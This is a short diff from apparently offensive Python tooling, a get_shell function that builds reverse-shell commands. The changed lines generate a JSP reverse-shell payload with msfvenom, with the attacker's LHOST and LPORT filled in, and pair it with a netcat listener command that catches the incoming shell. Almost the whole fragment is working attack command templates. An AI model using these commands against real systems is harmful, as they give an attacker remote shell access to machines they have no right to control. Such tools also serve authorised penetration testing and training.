@@ -99,7 +99,7 @@ def get_shell(ipaddr: str, port: int) -> dict:
         "description":
         "JSP stageless reverse shell",
         "reverse":
-        'msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%d -f jsp -o reverse.jsp' %
+        'msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%d -f raw -o reverse.jsp' %
         (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -luvnp %d" % (port)
